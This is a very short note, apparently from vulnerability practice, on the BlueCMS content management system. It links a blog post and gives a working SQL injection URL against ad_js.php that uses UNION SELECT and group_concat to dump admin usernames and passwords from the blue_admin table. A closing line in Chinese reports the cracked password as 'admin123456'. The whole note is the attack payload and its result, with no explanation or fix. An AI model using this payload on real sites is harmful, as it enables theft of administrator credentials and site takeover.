BlueCMS

https://www.cnblogs.com/Hi-blog/p/7990894.html#_label30

ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin

解出来密码是：admin123456
